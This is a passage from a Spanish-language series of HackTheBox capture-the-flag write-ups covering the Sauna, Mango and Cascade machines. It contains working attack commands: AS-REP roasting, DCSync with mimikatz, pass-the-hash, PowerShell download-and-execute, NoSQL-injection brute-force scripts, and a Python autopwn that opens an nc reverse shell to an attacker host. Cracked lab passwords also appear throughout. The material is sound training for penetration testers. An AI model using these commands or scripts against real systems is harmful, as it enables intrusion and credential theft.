    VOHMDjXUkihQGMBQBQDtFGHLZizXQMEAAjUUIx0cUDwAAAIlfEIgfO/h0eIN/FBByCIsPUf/Wg8QEx0cUDwAAAIlfEIgfg30cEHM+i1UYQlKNRQhQV/8V3DBAAIPEDOsxhfYPhTb///+L
    RSSJdTSD+RBzA41FJMYAAOlX////aEwyQAD/FVAwQACLTQiJD4ldCItVGItFHIlXEIlHFIldGIldHIN96BByCYtN1FH/1oPEBIN9HBDHRegPAAAAiV3kiF3UcgmLVQhS/9aDxASDfTgQx..." base64 -d > RemoteConnection.exe
    ```

1. Controlamos los ficheros con md5sum y transferimos el RemoteConnection.exe a una maquina Windos que tiene el Immunity Debugger con el DEP desabilitado.
1. Lanzando el programa en la maquina Windows, vemos que nos falta una .dll, la descargamos de internet y la ponemos en la routa `C:\Windows\System32`


Ya podemos lanzar el **Immunity Debugger** como administrador

1. Abrimos el RemoteConnection.exe desde el Immunity Debugger
1. En la ventana de arriba a la izquierda, hacemos un clic derecho > Search for > AllReferenced text strings

    vemos que hay un putty que sirbe de connection a una maquina linux desde windows.

1. Encontramos una string "clave", le damos al clic derecho > Follow in Disassembler

    Aqui vemos que hay un CMP que es un compare 

1. Justo antes de esta comparativa ponemos un breakpoint para ver con que se compara exactamente
1. Le damos al boton play

En la ventana de arriba a la derecha, podemos ver los datos que se utilizan para la coneccion con el SSH del usuario root.


```bash
ssh root@10.10.10.114
password: Qf7j8YSV.wDNF*[7d?j&eD4^
```

Ya estamos conectados como root y podemos leer la flag.

<!--chapter:end:49-Bitlab/49-04-PrivilegeEscalation.Rmd-->

# Sauna {-}

## Introduccion {-}

La maquina del dia se llama Sauna.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/H5m72jyuy84/0.jpg)](https://www.youtube.com/watch?v=H5m72jyuy84)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:50-Sauna/50-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.175
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.175
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.175 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,80,88,135,139,289,445,464,593,636,3269,5985,9389,49667,49673,49674,49677,49689,49698 10.10.10.175 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 80     | http       | WebFuzzin                                |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 464    | kpasswd5?  |                                          |                           |
| 593    | ncacn_http |                                          |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 9389   | mc-nmf     | Puertos por defecto de windows           |                           |
| 49667  | msrpc      | Puertos por defecto de windows           |                           |
| 49673  | msrpc      | Puertos por defecto de windows           |                           |
| 49673  | msrpc      | Puertos por defecto de windows           |                           |
| 49674  | ncacn_http | Puertos por defecto de windows           |                           |
| 49677  | msrpc      | Puertos por defecto de windows           |                           |
| 49689  | msrpc      | Puertos por defecto de windows           |                           |
| 49698  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.175
smbclient -L 10.10.10.175 -N
smbmap -H 10.10.10.175 -u 'null'
```

Vemos que estamos frente de una maquina Windows 10 que se llama **SAUNA** en el dominio **EGOTISTICAL-BANK.LOCAL** con un certificado firmado.
Añadimos el dominio al `/etc/hosts`.
Tambien vemos que no podemos ver los recursos compartidos a nivel de red con un null session.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.175 -N

rpcclient $> enumdomusers
```

Podemos conectar pero no nos deja ver usuarios del directorio activo.


### Kerbrute {-}

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags "-s -w" .
upx kerbrute
./kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.175
```

Es un IIS 10.0

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.175`, Vemos una pagina Egotistical Bank. Navegando por el `about.html` vemos usuarios potenciales. Vamos a recuperarlos
con bash

```bash
curl -s -X GET "http://10.10.10.175/about.html"
curl -s -X GET "http://10.10.10.175/about.html" | grep "p class=\"mt-2"
curl -s -X GET "http://10.10.10.175/about.html" | grep "p class=\"mt-2" | grep "Fergus Smith" -A 100 | html2text > users
```

Modificamos el fichero users para crear nombres de usuarios como `fsmith`,`f.smith`,`frank.smith`, `smithf`, `smith.frank` o otros y intentamos un asproasting attack.

<!--chapter:end:50-Sauna/50-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Asproasting {-}

```bash
GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users
```

Aqui vemos un hash para el usuario `fsmith`. Lo copiamos en un fichero `fsmith_hash` y intentamos romperlo con john.

### Crackeando el hash con John {-}

```bash
john -wordlists=/usr/share/wordlists/rockyou.txt fsmith_hash
```

Validamos el usuario con crackmap exec

```bash
crackmapexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

El usuario es valido pero no tenemos un Pwn3d. Checkeamos si es valido con winrm

```bash
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

Ademas de ser valido, aqui no pone un Pwn3d! que significa que podemos conectarnos con Evil-WinRM.

<!--chapter:end:50-Sauna/50-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Coneccion con EVIL-WINRM {-}


```bash
evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
whoami
ipconfig
type ../Desktop/user.txt
```

Ya podemos leer la flag.

<!--chapter:end:50-Sauna/50-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
cd C:\Users\Administrator
dir
whoami /priv
whoami /all
net user
```

No tenemos ningun privilegio interessante, tenemos que reconocer el systema.

1. Creamos un directorio para trabajar

    ```powershell
    cd C:\Windows\Temp
    mkdir Recon
    cd Recon
    ```

1. En la maquina de atacante no descargamos el WinPeas

    ```bash
    wget https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe
    mv winPEASx64.exe winPEAS.exe
    ```

1. Lo uploadeamos desde la maquina victima y lo lanzamos

    ```powershell
    upload winPEAS.exe
    ./winPEAS.exe


    ```

    Aqui hemos encontrado unas credenciales para un autologon.

1. Validamos el usuario desde la maquina de atacante

    ```bash
    crackmapexec win rm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
    ```

1. Nos conectamos nuevamente con **Evil-WinRM**

    ```bash
    evil-winrm -i 10.10.10.275 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
    whoami
    whoami /priv
    whoami /all
    ```

    Nuevamente no encontramos nada muy interesante. Aqui tenemos que tirar de bloodhound

1. En la maquina de atacante preparamos el bloodhound

    ```bash
    sudo apt install neo4j bloodhound -y
    neo4j console

    bloodhoud &> /dev/null & disown

    wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
    python -m http.server 80
    ```

1. Recolectamos data desde la maquina victima

    ```powershell
    cd C:\Windows\Temp
    mkdir privesc
    cd privesc
    IEX(New-Object Net.WebClient).downloadString('http://10.10.17.51/SharpHound.ps1')
    Invoke-BloodHound -CollectionMethod All
    dir
    download 20210908210119_BloodHound.zip
    ```

Una vez el zip en la maquina de atacante, lo cargamos al BloodHound. Cargado vamos a la pestaña Analysis y 
miramos por `Find Shortest Paths to Domain Admins` pero no vemos gran cosa. Miramos el `Find Principals with DCSync Rights`
y vemos que el usuario **svc_loanmgr** tiene privilegios *GetChanges* y *GetChangesAll* sobre el dominio **EGOTISTICAL-BANK.LOCAL**.
Esto significa que podemos hacer un DCSync attack con este usuario.

#### DCSync Attack con mimikatz {-}

Buscamos el mimikatz en nuestra maquina de atacante

```bash
locate mimikatz.exe
cp /usr/share/mimikatz/x64/mimikatz.exe .
python -m http.server 80
```

Lo descargamos en la maquina victima y lo lanzamos para extraer el hash del usuario Administrator.

```powershell
iwr -uri http://10.10.17.51/mimikatz.exe -OutFile mimikatz.exe
C:\Windows\Temp\privesc\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit
```

Ahora que hemos recuperado el Hash NTLM del usuario Administrator, podemos hacer un **pass the hash**.

```bash
evil-winrm -i 10.10.10.175 -u 'Administrator' -H 823452073d75b9d1cf70ebdf86c7f98e
```

Ya somos usuario Administrator y podemos leer la flag.

<!--chapter:end:50-Sauna/50-04-PrivilegeEscalation.Rmd-->

# Mango {-}

## Introduccion {-}

La maquina del dia se llama Mango.

El replay del live se puede ver aqui

[![S4vitaar OpenAdmin maquina](https://img.youtube.com/vi/DvPh6BXdHgo/0.jpg)](https://www.youtube.com/watch?v=DvPh6BXdHgo)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:51-Mango/51-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.162
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.162
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.162 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,443 10.10.10.162 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | http     | Web, Fuzzing       |            |
| 443    | https    | Web, Fuzzing       |            |


El scaneo de nmap nos muestra 2 dominios 

- mango.htb
- staging-order.mango.htb

los añadimos al `/etc/hosts`

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.162
whatweb https://10.10.10.162
```

Es un Apache 2.4.29 en un Ubuntu. El puerto 80 nos muestra un 403 Forbiden pero no el 443.

#### Checkeamos el certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.162:443
```

Nuevamente vemos el dominio `staging-order.mango.htb`

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.162`, Vemos que no tenemos acceso. Si vamos con **https**, vemos una web stylo Google.
Ocure lo mismos con el dominio `mango.htb` pero con el dominio `staging-order.maquina.htb` por **http**, vemos un panel de inicio de 
session.

Aqui probamos cosas uzando el burpsuite.

```bash
username=admin&password=admin&login=login
username=admin'&password=admin&login=login
username=admin'&password=admin'&login=login
username=admin' or 1=1-- -&password=admin&login=login
username=admin' and sleep(5)-- -&password=admin&login=login
username=admin' and sleep(5)#&password=admin&login=login
username=admin' or sleep(5)#&password=admin&login=login
username=admin or sleep(5)#&password=admin&login=login
username=admin and sleep(5)#&password=admin&login=login
```

No parece ser vulnerable a SQLI.

<!--chapter:end:51-Mango/51-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### NO SQLI {-}

El nombre de la maquina Mango nos hace pensar a Mango DB que uza NO SQL. Miramos en  [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
para ver si se puede hacer algo con NO SQLI

```bash
username[$ne]=admin&password[$ne]=admin&login=login
```

Aqui vemos que la respuesta es differente de la precedente lo que quiere decir que es probable que seamos frente de una vulnerabilidad **NOSQLI**

Vamos a probar cosas con expressiones regulares

```bash
username[$regex]=^a&password[$ne]=admin&login=login
Respuesta : 302 Found

username[$regex]=^b&password[$ne]=admin&login=login
Respuesta : 200 Ok

username[$regex]=^ad&password[$ne]=admin&login=login
Respuesta : 302 Found

username[$regex]=^ab&password[$ne]=admin&login=login
Respuesta : 200 Ok
```

Suponiendo que existe un usuario admin, vemos que con expresiones regulares, cuando acertamos tenemos una respuesta a lado de servidor 302 y a cada error un 200.

Nos creamos un script en python para el NOSQLI

```python
#!/usr/bin/python3

import pdb # Debugging
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://staging-order.mango.htb"
characters = string.ascii_letters

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fase de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password[admin]")
    username = ""

    while True:
        for character in characters:

            p1.status("Probando con el caracter %c" % character)

            # NoSQL Injection
            post_data = {
                'username': f"^{username + character}",
                'password[$ne]':'admin',
                'login': 'login'
            }

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                username += character
                p2.status(password)
                break


if __name__ == '__main__':

    makeRequest()
```

Este pequeño script nos permite encontrar el usuario **admin** y el usuario **mango**.
Modificamos el script para encontrar la contraseñas de los usuarios.

```python
#!/usr/bin/python3

import pdb # Debugging
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://staging-order.mango.htb"
characters = string.ascii_letters + string.digits + string.punctuation

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fase de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password[admin]")
    password = ""

    while True:
        for character in characters:

            p1.status("Probando con el caracter %c" % character)

            # NoSQL Injection
            post_data = {
                'username': 'admin',
                'password[$regex]': f"^{re.escape(password + character)}",
                'login': 'login'
            }

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                username += character
                p2.status(password)
                break


if __name__ == '__main__':

    makeRequest()
```

Cambiando el usuario de admin a mango, tenemos las dos contraseñas. Como el login nos lleva a un **Under Plantation**, Miramos si nos podemos connectar por **ssh**

<!--chapter:end:51-Mango/51-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con ssh {-}

```bash
ssh admin@10.10.10.162
Password: t9KcS3>!0B#2

ssh mango@10.10.10.162
Password: h3mXK8RhU~f{]f5H
```

Hemos ganado accesso al systema como el usuario **mango**.
Vemos que la flag esta en el directorio `/home/admin` tenemos que pasar al usuario admin con el comando `su admin`.

### Autopwn completo para el usuario mango {-}

```python
#!/usr/bin/python3

import pdb # Debugging
from pexpect import pxssh
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://staging-order.mango.htb"
characters = string.ascii_letters + string.digits + string.punctuation
lport = 443

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fase de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password[mango]")
    password = ""

    for x in range(0, 20):
        for character in characters:

            p1.status("Probando con el caracter %c" % character)

            # NoSQL Injection
            post_data = {
                'username': 'mango',
                'password[$regex]': f"^{re.escape(password + character)}",
                'login': 'login'
            }

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                password += character
                p2.status(password)
                break

    return password

def sshConnection(username, password):

    s = pxssh.pxssh()
    s.login('10.10.10.162', username, password)
    s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f")
    s.prompt()
    s.logout()

if __name__ == '__main__':

    password = makeRequest()

    try:
        threading.Thread(target=sshConnection, args=('mango', password)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
```

<!--chapter:end:51-Mango/51-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
find \-perm -4000 2>/dev/null
ls -la ./usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Aqui vemos que tenemos privilegios SUID sobre el binario `jjs` de java. Buscamos en [gtfobins](https://gtfobins.github.io/gtfobins/jjs/#suid)
como escalar el privilegio con jjs. 

```bash
echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod 4755 /bin/bash').waitFor()" | jjs
bash -p
whoami
#Output
root
```

Ya podemos leer el **root.txt**


<!--chapter:end:51-Mango/51-04-PrivilegeEscalation.Rmd-->

# Cascade {-}

## Introduccion {-}

La maquina del dia se llama Cascade.

El replay del live se puede ver aqui

[![S4vitaar Cascade maquina](https://img.youtube.com/vi/whzdQw-zW_k/0.jpg)](https://www.youtube.com/watch?v=whzdQw-zW_k)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:52-Cascade/52-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.182
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.182
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.182 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,389,445,636,3268,5985,49154,49155,49157,49158,49170 10.10.10.182 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 49154  | msrpc      | Puertos por defecto de windows           |                           |
| 49155  | msrpc      | Puertos por defecto de windows           |                           |
| 49157  | ncacn_http | Puertos por defecto de windows           |                           |
| 49158  | msrpc      | Puertos por defecto de windows           |                           |
| 49170  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.182
smbclient -L 10.10.10.182 -N
smbmap -H 10.10.10.182 -u 'null'
```

Vemos que estamos frente de una maquina Windows 6.1 que se llama **CASC-DC1** en el dominio **cascade.local** con un certificado firmado.
Añadimos el dominio al `/etc/hosts`.
Aqui, no podemos ver los recursos compartidos a nivel de red con un null session.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.182 -N

rpcclient $> enumdomusers
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers"
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]'
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x"
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]'
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users
```

Tambien podemos aprovechar de la utilidad de S4vitar 

```bash
git clone https://github.com/s4vitar/rpcenum
cd rpcenum
./rpcenum -e All -i 10.10.10.182
```

Como tenemos un listado de usuarios, podemos explotar un Asproasting ataque.

### Asproasting Attack {-}

```bash
GetNPUsers.py cascade.local/ -no-pass -userfile users
```

Aqui no podemos ver nada.

### Kerbrute {-}

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags "-s -w" .
upx kerbrute
./kerbrute userenum --dc 10.10.10.182 -d cascade.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Tampoco vemos nada aqui.

<!--chapter:end:52-Cascade/52-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### ldapsearch {-}

Como el ldap esta disponibles, usamos **ldapsearch** para enumerar el LDAP.

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local"
```

Como la enumeracion es muy grande, buscamos emails

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local"
```

Miramos por cada uno de estos usuarios encontrados si hay informaciones relevantes por cada uno de ellos mirando las 20 lineas que hay debajo
del grep

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local -A 20
```

Debajo del usuario **r.thompson** vemos un cascadeLegacyPwd en base64

```bash
echo "clk0bjVldmE=" | base64 -d; echo
```

Tiene pinta de ser una contraseña.

Validamos el usuario con crackmapexec

```bash
crackmapexec smb 10.10.10.182 -u "r.thompson" -p "rY4n5eva"
```

Vemos que este usuario es valido pero no nos da un **Pwn3d!**. Miramos si podemos connectar por WinRM

```bash
crackmapexec winrm 10.10.10.182 -u "r.thompson" -p "rY4n5eva"
```

pero no.

Miramos Si tenemos accesso a directorio compartidos a nivel de red

```bash
smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
```

podemos ver recursos como:

- Data
- NETLOGON
- print$
- SYSVOL

Creamos una montura contra el directorio `Data`

```bash
mkdir /mnt/smbmounted
mount -t cifs //10.10.10.182/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw
cd /mnt/smbmounted
tree
```

Vemos un fichero `Meeting_Notes_June_2018.html` y lo analyzamos desde un servidor web

```bash
cd /var/www/html
cp /mnt/smbmounted/IT/Email\ Archives/Meeting_Notes_June_2018.html index.html
service apache2 start
```

Y lo miramos desde firefox en localhost. Y vemos un email escrito por Steve (s.smith) que nos dice que hay una cuenta temporar 
llamada TempAdmin que a sido creada para manejar migraciones y que esta cuenta tiene la misma contraseña que el usuario admin.

Mirando los otros ficheros, vemos un `VNC Install.reg`.

```bash
file VNC\ Install.reg
cat VNC\ Install.reg
```

Aqui podemos ver una contraseña en hexadecimal

```bash
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ','
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -ps -r
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -ps -r > pass
cat password
```

Vemos que el contenido esta encryptado. Buscamos por internet si existe un decrypter para contraseñas de VNC

```bash
git clone https://github.com/jeroennijhof/vncpwd
cd vncpwd
make
make install
upx
./vncpwd password
```

Aqui vemos la contraseña. Lo validamos con crackmapexec

```bash
crackmapexec smb 10.10.10.182 -u "s.smith" -p "sT333ve2"
crackmapexec winrm 10.10.10.182 -u "s.smith" -p "sT333ve2"
```

El usuario es validado y ademas tiene un **Pwn3d!** en el winrm.

<!--chapter:end:52-Cascade/52-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Coneccion con EVIL-WINRM {-}


```bash
evil-winrm -i 10.10.10.182 -u 's.smith' -p 'sT33ve2'
whoami
ipconfig
type ../Desktop/user.txt
```

Ya podemos leer la flag.

<!--chapter:end:52-Cascade/52-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
cd C:\Users\Administrator
dir
whoami /priv
whoami /all
net user
net localgroup "Audit Share"
```

Aqui vemos quel usuario es parte de un grupo `Audit Share` y que le da el privilegio de ver un recurso compartido a nivel de red llamado `\\Casc-DC1\Audit$`.

```bash
smbmap -H 10.10.10.182 's.smith' -p 'sT33ve2'
mkdir Audit
cd Audit
smbclient //10.10.10.182/Autdit$ -U "s.smith%sT33ve2"
dir
prompt off
recurse ON
mget *
```

Aqui hemos descargado todo los ficheros del recurso compartido. Hay un fichero `Audit.db`, lo analyzamos con sqlite

```bash
cd DB
sqlite3 Audit.db

.tables
select * from DeletedUserAudit;
select * from Ldap;
```

Vemos una contraseña encryptada en base64 del usuario `ArkSvc`.

```bash
echo "8QO5l5Kj9MdErXx6Q6AG0w==" | base64 -d; echo
echo "8QO5l5Kj9MdErXx6Q6AG0w==" | base64 -d > arksvc_password
cat arksvc_password
```

Nuevamente vemos que es una contraseña encryptada. Tenemos que buscar con que a sido encryptada.

Como hay differentes ficheros windows, transferimos los ficheros a una maquina windows.

En la maquina windows, instalamos el `dotPeek` que es una heramienta que nos permite analyzar codigo dotNet a bajo nivel.
Vemos aqui una Key y utiliza la dll CascCrypto para encryptar y desencryptar cosas. Analyzamos la dll y vemos que utiliza un **Modo CBC** para 
encryptar y desencryptar. Vemos un **IV** y con [cyberChef](https://gchq.github.io/CyberChef/) desencryptamos la contraseña.

<div class="figure">
<img src="images/Cascade-cbc-decrypt.png" alt="CBC decrypt with cyberchef" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-84)CBC decrypt with cyberchef</p>
</div>

Ya tenemos contraseña y validamos con crackmapexec.

```bash
crackmapexec smb 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
crackmapexec winrm 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
```

Como el usuario esta **Pwn3d!** con winrm nos connectamos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
```

Enumeramos

```powershell
cd C:\Users\Administrator
dir
whoami /priv
```

Aqui vemos que el usuario es parte del grupo **AD Recycle Bin** y esto nos hace pensar que los ficheros que hemos visto
contiene un log en el cual habia el usuario **AdminTemp** en el **Recycle Bin**. Esto podria permitirnos buscar Objetos
borrados. Buscando por internet encontramos un comando:

```powershell
Get-ADDObject -Filter 'Deleted -eq $true' -IncludeDeletedObjects
```

Encontramos el usuario borrado pero necesitamos ver si podemos encontrar propriedades de este objeto

```powershell
Get-ADDObject -Filter 'Deleted -eq $true' -IncludeDeletedObjects -Properties *
```

Aqui encontramos su **CascadeLegacyPwd** en base64

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d; echo
```

Parece ser una contraseña. Como en el email que hemos encontrado, se supone que la contraseña es la misma que la contraseña del usuario **Administrator**.
Lo comprobamos

```bash
crackmapexec smb 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'
```

y si vemos el **Pwn3d!**. Esto quiere decir que nos podemos conectar con **Evil WinRM**.

```bash
evil-winrm -i 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'

whoami
#Output 
cascade\administrator
```

Ya podemos leer la flag.


<!--chapter:end:52-Cascade/52-04-PrivilegeEscalation.Rmd-->

# Schooled {-}

## Introduccion {-}

La maquina del dia se llama Schooled.

El replay del live se puede ver aqui

[![S4vitaar Schooled maquina](https://img.youtube.com/vi/gsz_aK-r_8s/0.jpg)](https://www.youtube.com/watch?v=gsz_aK-r_8s)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:53-Schooled/53-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.234
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.234
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.234 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,443 10.10.10.234 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | http     | Web, Fuzzing       |            |
| 33060  | mysql?   | SQLI               |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.234
```

Es un Apache 2.4.46 en un **FreeBSD** con PHP 7.4.15. Vemos un email `admission@schooled.htb`, añadmimos el dominio al `/etc/hosts`.


#### Checkear la web {-}

Si entramos en la url `http://10.10.10.234` o `http://schooled.htb` vemos lo mismo. El wappalizer no nos muestra nada interessante.
No vemos commentarios interessante en el codigo fuente. Si pinchamos al link **About**, vemos que la pagina se carga con una animacion.
Investigamos lo que ocure al lado del servidor con **BurpSuite** pero no vemos nada.
En la pagina `http://10.10.10.234/about.html` vemos probables usuarios en el testimonials. En la pagina `http://10.10.10.234/teachers.html` 
vemos mas usuarios potenciales. Decidimos crear un diccionario con estos usuarios por si acaso.

```bash
vi users

James Fernando
j.fernando
jfernando
Jacques Philips
j.philips
jphilips
Venanda Mercy
v.mercy
vmercy
Jane Higgins
j.higgins
jhiggins
Lianne Carter
l.carter
lcarter
Manuel Phillips
m.phillips
mphillips
Jamie Borham
j.borham
jborham
```

#### Fuzzing {-}

```bash
nmap --script http-enum -p80 10.10.10.234 -oN webScan
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.234/FUZZ
```

Como no encontramos nada interessante, vamos a enumerar subdominios con **WFUZZ**

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.shooled.htb http:10.10.10.234
wfuzz -c -t 200 --hc=404 --hl=461 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.shooled.htb http:10.10.10.234
```

Encontramos un subdominio `moodle.schooled.htb`, lo añadmimos al `/etc/hosts`.





<!--chapter:end:53-Schooled/53-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### Moodle {-}

Por la url `http://moodle.schooled.htb` vemos usuarios que ya tenemos en nuestro diccionario. Vemos que para ver los recursos, nos tenemos que
